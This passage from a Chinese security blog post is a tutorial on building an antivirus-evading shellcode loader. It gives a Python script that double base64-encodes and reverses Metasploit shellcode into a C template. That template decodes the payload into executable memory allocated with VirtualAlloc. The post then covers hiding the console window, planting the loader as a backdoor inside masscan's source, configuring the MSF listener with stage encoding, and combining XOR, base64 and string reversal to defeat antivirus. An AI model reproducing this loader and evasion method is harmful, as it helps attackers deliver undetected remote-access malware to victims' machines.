4;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    /* Note: (nprbytes == 1) would be an error, so just ingore that case */</span></span><br><span class="line"><span class="string">    if (nprbytes &gt; 1) &#123;</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    if (nprbytes &gt; 2) &#123;</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    if (nprbytes &gt; 3) &#123;</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    *(bufout++) = &#x27;\\0&#x27;;</span></span><br><span class="line"><span class="string">    nbytesdecoded -= (4 - nprbytes) &amp; 3;</span></span><br><span class="line"><span class="string">    return nbytesdecoded;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">static const char basis_64[] =</span></span><br><span class="line"><span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;</span></span><br><span class="line"><span class="string">int Base64encode_len(int len)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    return ((len + 2) / 3 * 4) + 1;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">int Base64encode(char* encoded, const char* string, int len)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int i;</span></span><br><span class="line"><span class="string">    char* p;</span></span><br><span class="line"><span class="string">    p = encoded;</span></span><br><span class="line"><span class="string">    for (i = 0; i &lt; len - 2; i += 3) &#123;</span></span><br><span class="line"><span class="string">        *p++ = basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span></span><br><span class="line"><span class="string">        *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span></span><br><span class="line"><span class="string">            ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span></span><br><span class="line"><span class="string">        *p++ = basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2) |</span></span><br><span class="line"><span class="string">            ((int)(string[i + 2] &amp; 0xC0) &gt;&gt; 6)];</span></span><br><span class="line"><span class="string">        *p++ = basis_64[string[i + 2] &amp; 0x3F];</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    if (i &lt; len) &#123;</span></span><br><span class="line"><span class="string">        *p++ = basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span></span><br><span class="line"><span class="string">        if (i == (len - 1)) &#123;</span></span><br><span class="line"><span class="string">            *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4)];</span></span><br><span class="line"><span class="string">            // *p++ = &#x27;=&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        else &#123;</span></span><br><span class="line"><span class="string">            *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span></span><br><span class="line"><span class="string">                ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span></span><br><span class="line"><span class="string">            *p++ = basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2)];</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        //*p++ = &#x27;=&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    *p++ = &#x27;\\0&#x27;;</span></span><br><span class="line"><span class="string">    return p - encoded;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">string_change(unsigned char* p) &#123;</span></span><br><span class="line"><span class="string">    int i, len;</span></span><br><span class="line"><span class="string">    char temp;</span></span><br><span class="line"><span class="string">    len = strlen(p);</span></span><br><span class="line"><span class="string">    for (size_t i = 0; i &lt; (len / 2); i++)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        temp = p[i];</span></span><br><span class="line"><span class="string">        p[i] = p[len - 1 - i];</span></span><br><span class="line"><span class="string">        p[len - 1 - i] = temp;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">main()&#123;</span></span><br><span class="line"><span class="string">    unsigned char init_buf[] = &quot;%s&quot;;</span></span><br><span class="line"><span class="string">    char kekeoyyds_bufs[1024] = &#123; 0 &#125;;</span></span><br><span class="line"><span class="string">    char kekeoyyds_buf[1024] = &#123; 0 &#125;;</span></span><br><span class="line"><span class="string">    string_change(init_buf);</span></span><br><span class="line"><span class="string">    Base64decode(kekeoyyds_bufs, init_buf);</span></span><br><span class="line"><span class="string">    Base64decode(kekeoyyds_buf, kekeoyyds_bufs);</span></span><br><span class="line"><span class="string">    char* dmagic_memory;</span></span><br><span class="line"><span class="string">    dmagic_memory = VirtualAlloc(NULL, sizeof(kekeoyyds_buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span></span><br><span class="line"><span class="string">    memcpy(dmagic_memory, kekeoyyds_buf, sizeof(kekeoyyds_buf));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&quot;开始处理：%s&quot;</span> % sys.argv[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> file:</span><br><span class="line">            shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> file.readlines():</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;unsigned&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> i:</span><br><span class="line">                    shellcode += i.strip(<span class="string">&quot;\n&quot;</span>).strip(<span class="string">&quot;\r&quot;</span>).strip(<span class="string">&quot;;&quot;</span>).strip(<span class="string">&quot;\&quot;&quot;</span>)</span><br><span class="line">            print(shellcode)</span><br><span class="line">            exec(<span class="string">&#x27;shellcode = b&quot;%s&quot;&#x27;</span> % shellcode)</span><br><span class="line">            shellcode = base64.b64encode(shellcode)</span><br><span class="line">            shellcode = base64.b64encode(shellcode)</span><br><span class="line">            shellcode = shellcode.decode(<span class="string">&quot;utf8&quot;</span>)[::-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./&quot;</span>+sys.argv[<span class="number">2</span>],<span class="string">&quot;w+&quot;</span>) <span class="keyword">as</span> shellcodefile:</span><br><span class="line">                shellcodefile.write(text % shellcode)</span><br><span class="line">                print(<span class="string">&quot;处理完毕：%s&quot;</span> % sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(sys.argv)</span><br><span class="line">        print(<span class="string">&quot;python base.py shell.c shellcode.c&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img.rruu.net/image/5fd5d73516e9b" alt="image-20201212140625873"></p>
<p>在头部添加一下取消黑色窗口的小东西。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img.rruu.net/image/5fd5d7540d294" alt="image-20201212201349803"></p>
<p>将base64编码函数和反转字符串函数一同复制进来。</p>
<p><img src="https://img.rruu.net/image/5fd5dacd6ca03" alt="image-20201213171130638"></p>
<p>右键，重新生成，找到bin目录，查看exe。</p>
<p><img src="https://img.rruu.net/image/5fd5d76adb1cb" alt="image-20201212150207069"></p>
<p>放到虚拟机测试一下</p>
<p><img src="https://img.rruu.net/image/5fd5d788c6df5" alt="image-20201213154141372"></p>
<p>MSF配置如下</p>
<p><img src="https://img.rruu.net/image/5fd5d7a8315cb" alt="image-20201213154339599"></p>
<p>然后要设置一下EnableStageEncoding为ture</p>
<p><img src="https://img.rruu.net/image/5fd5d7a828eb9" alt="image-20201213154438122"></p>
<p>效果如下</p>
<p><img src="https://img.rruu.net/image/5fd5d7b161861" alt="image-20201213154252380"></p>
<p>总结：shellcode免杀的执行方式不止我上面说的那个，其实还有很多。有兴趣的同学可以去github上看看 <a target="_blank" rel="noopener" href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a> ，看看26到29。我们上面通过在masscan中植入后门代码来进行免杀，其实就是一个小小的测试。同学们完全可以自己去寻找其他语言开发的代码一样的植入进去。然后通过，反转字符串，xor异或加密，base64加密等等方式来对抗杀软，相互结合使用效果会更好。</p>
<p>文章使用工具：<a target="_blank" rel="noopener" href="https://wwa.lanzous.com/b0a9fcyqh">https://wwa.lanzous.com/b0a9fcyqh</a>  密码:f33v</p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="Update time"></i>
              2020-12-23 19:17:55
            </span>
            
          </div>
          <div class="post-foot-prev">
            
              <a href="/2020/12/23/Linux_lxc%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87/" target="_self">
                <span>Next</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div class="post-catalog" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode%E6%89%A7%E8%A1%8C%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF"><span class="toc-text">Shellcode执行工具编写思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99Shellcode%E6%89%A7%E8%A1%8C%E5%B7%A5%E5%85%B7"><span class="toc-text">编写Shellcode执行工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode%E4%B8%8A%E7%BA%BF%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF"><span class="toc-text">Shellcode上线免杀思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode%E5%85%8D%E6%9D%80%E5%AE%9E%E6%88%98"><span class="toc-text">Shellcode免杀实战</span></a></li></ol>
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
  </div>


        <div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/magisec/">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/magisec/magisec.github.io">Theme by Hacktrick</a>
        
    </div>
  
</div>

      </div>

      <div class="back-to-top hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



      
  <div class="search-icon" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="Search...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




    </div>
  </body>
</html>
